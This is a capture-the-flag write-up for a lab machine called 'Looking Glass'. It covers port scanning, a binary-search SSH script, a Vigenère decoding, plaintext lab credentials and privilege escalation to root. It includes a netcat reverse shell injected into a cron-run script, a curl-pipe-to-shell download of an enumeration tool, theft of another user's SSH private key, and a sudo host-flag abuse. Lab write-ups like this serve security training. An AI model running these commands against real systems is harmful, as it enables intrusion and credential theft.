## Looking Glass

### Reconnassance
First we need to see what ports are open:

```sudo nmpa -sV -sC -oN nmap/initials 10.10.229.28```

Result:
```bash
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f15197035fddd0d07a050a37dfa10a0 (RSA)
|   256 a8675c52770241d790e7ed32d201d965 (ECDSA)
|_  256 2692592d5e25908909f5e5e03381776a (ED25519)
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9009/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9010/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9011/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9040/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9050/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9071/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9080/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9081/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9090/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9091/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
9099/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
.
.
.
.
.
13722/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
13782/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
13783/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 fff4db79a9bcb88ad43f56c2cfcb7d11 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

About 4000+ ports opened, and if we check one by one, it will show either we need to check higher or lower ssh port.

To make it faster, let's use binary search implementation script to find the right prot wiht "Lower" and "Higher" parameter check

```py
import subprocess

def binarysearch(arr, url):
    low = 0
    high = len(arr)-1
    while low <= high:
        mid = (low + high) // 2
        p = arr[mid]
        command = [
            "ssh", "-p", str(p), "-o", "HostKeyAlgorithms=ssh-rsa",
            "-o", "StrictHostKeyChecking=no", url
        ]
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()

        output = output.decode('utf-8')
        error = error.decode('utf-8')

        if "Lower" in output:
            print(f'[!] not this port {p}, Lower! {arr[low]} {arr[high]}')
            low = mid + 1
        elif "Higher" in output:
            print(f'[!] not this port {p}, Higher! {arr[low]} {arr[high]}')
            high = mid - 1
        else:
            print(f'This port {p}')
            break
            
arr  = [i for i in range(9000,13783)]
print(len(arr))

binarysearch(arr, "10.10.229.28")
```

The result is:

```txt
[!] not this port 11224, Lower! 9000 13449
[!] not this port 12337, Lower! 11225 13449
[!] not this port 12893, Higher! 12338 13449
[!] not this port 12615, Higher! 12338 12892
[!] not this port 12476, Higher! 12338 12614
[!] not this port 12406, Lower! 12338 12475
[!] not this port 12441, Higher! 12407 12475
[!] not this port 12423, Lower! 12407 12440
[!] not this port 12432, Higher! 12424 12440
This port 12427
```

if we access that port, we'll get a enoded poem:
```txt
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:	Incorrect secret.
```

To solve this, we need to a brute forxce on vigenere chiper, the secret we need to inptu is: ``bewareTheJabberwock``

then we get a user and password which is:
``jabberwock:ExplanationCrowdedMannersIntroducing``

then let's try to conenct to main ssh port (22) with that user credential

now we're already in the machine as jabberwock, if we look at the home directory:
```
jabberwock@looking-glass:~$ ls /home
alice  humptydumpty  jabberwock  tryhackme  tweedledee  tweedledum
```

Here we'll get the first flag in the user.txt

now let's look at information that we may find and give us access to escalate our privilege.

jabberwock user able to reboot as sudo, some good information, now if we look for more, in the crontab section, the system will automaticly run 
```
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```
when we reboot the system, as inofrmation, we have write access on twasBrillig.sh, how if we change the code, to give us reverse shell as tweedledump

```sh
nc "[Machine IP]" 1234 -e /bin/bash
```

now let's listen in our machine for any reverse shell, then wait for a shell.

``nc -lnvp 1234``

result:
```bash
┌──(djumanto㉿DESKTOP-6PUFOAG)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.18.108.222] from (UNKNOWN) [10.10.229.28] 40166
bash: cannot set terminal process group (884): Inappropriate ioctl for device
bash: no job control in this shell
tweedledum@looking-glass:~$ ls
ls
humptydumpty.txt
poem.txt
```

humpty dumpty contains some hashy hex things, first thing i tried is read from hex
```txt
[Broken Dump Bit nonsense] the password is zyxwvutsrqponmlk
```

we got another hash for the password, so what we'r going to do is using cracker, but... i ran out of clue, so i just tried to access it to random user humptydumpty and i can't, so i tread to acces it via tweedledee then run su humptydumpty:
```bash
tweedledee@looking-glass:/home/tweedledee$ su humptydumpty
su humptydumpty
Password: zyxwvutsrqponmlk

humptydumpty@looking-glass:/home/tweedledee$ ls
ls
ls: cannot open directory '.': Permission denied
humptydumpty@looking-glass:/home/tweedledee$ cd /home/humptydumpty
cd /home/humptydumpty
humptydumpty@looking-glass:~$ ls
ls
poetry.txt
```
i ran out of idea, so i use linpeas, and it shows me that i have read access to alice ssh key as humptydumpty.

Step to reproduce:
- Download [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) from github
- open port ``python3 -m http.server 3333``
- in the victim terminal run ``curl -L [Your IP:Port/linpeas.sh] | sh``

```sh
╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw------- 1 humptydumpty humptydumpty 1679 Jul  3  2020 /home/alice/.ssh/id_rsa
```
So i read it and copy to local then access alice terminal using sshkey we got before.

another insteresting information is this:
```
Sudoers file: /etc/sudoers.d/alice is readable                       
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

yep, we able to run it as root, if we run it as superuser which is alice, then we got a bash as root, so let's do it:

```
sudo -h ssalg-gnikool /bin/bash
```

Result:
![image](https://github.com/DJumanto/Portswigger-XSS/assets/100863813/ea44b4f7-4517-4987-ba81-10d0f646e76e)

